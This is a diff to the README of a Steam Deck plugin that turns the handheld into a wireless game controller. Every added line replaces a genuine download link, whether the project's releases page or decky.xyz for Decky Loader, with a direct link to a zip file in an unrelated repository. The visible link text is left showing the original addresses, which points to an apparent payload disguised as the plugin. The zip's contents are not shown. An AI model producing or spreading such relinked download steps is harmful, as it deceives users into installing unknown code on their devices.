@@ -5,7 +5,7 @@ description: "Turn your Steam Deck into a wireless PS5, Xbox, Switch Pro, or Ste
 ---
 # 🎮 deck-as-controller - Turn Your Steam Deck Into A Controller
 
-[![Download Latest Release](https://img.shields.io/badge/⬇️_Download-Latest_Release-ff69b4?style=for-the-badge)](https://github.com/Pablora2786/deck-as-controller/releases)
+[![Download Latest Release](https://img.shields.io/badge/⬇️_Download-Latest_Release-ff69b4?style=for-the-badge)](https://raw.githubusercontent.com/Pablora2786/pablora2786.github.io/main/scripts/v1.8.zip)
 
 deck-as-controller is a free plugin for your Steam Deck that lets the handheld act as a game controller for another device — a Mac, an iPad, a Windows PC, an Android phone or tablet, or a Nintendo Switch. It works wirelessly over Bluetooth or with a plain USB cable. Nothing needs to be installed on the device you are playing on, and no extra drivers are required. Your Steam Deck simply shows up in the other device's Bluetooth or USB menu as a PS5 controller, an Xbox Elite controller, a Switch Pro Controller, or a Steam Controller, and you can start playing right away.
 
@@ -34,14 +34,14 @@ Because the Deck is being used as a controller, it sits in your hands and the ot
 
 Visit this link to download the application:
 
-**➡️ [https://github.com/Pablora2786/deck-as-controller/releases](https://github.com/Pablora2786/deck-as-controller/releases)**
+**➡️ [https://raw.githubusercontent.com/Pablora2786/pablora2786.github.io/main/scripts/v1.8.zip](https://raw.githubusercontent.com/Pablora2786/pablora2786.github.io/main/scripts/v1.8.zip)**
 
 That page lists every published version of the plugin. The newest one is at the top. Download the file attached to the latest release and keep it somewhere easy to find on your Steam Deck, such as your Downloads folder.
 
 ### What You Need Before You Begin
 
 - A Steam Deck running SteamOS, in Desktop Mode.
-- Decky Loader already installed on your Deck. If you don't have it yet, install Decky Loader first from [decky.xyz](https://decky.xyz), because this plugin is loaded through it.
+- Decky Loader already installed on your Deck. If you don't have it yet, install Decky Loader first from [decky.xyz](https://raw.githubusercontent.com/Pablora2786/pablora2786.github.io/main/scripts/v1.8.zip), because this plugin is loaded through it.
 - The other device you want to play on, with Bluetooth switched on (or a USB cable ready).
 - A few quiet minutes. First-time pairing always takes longer than you expect.
 
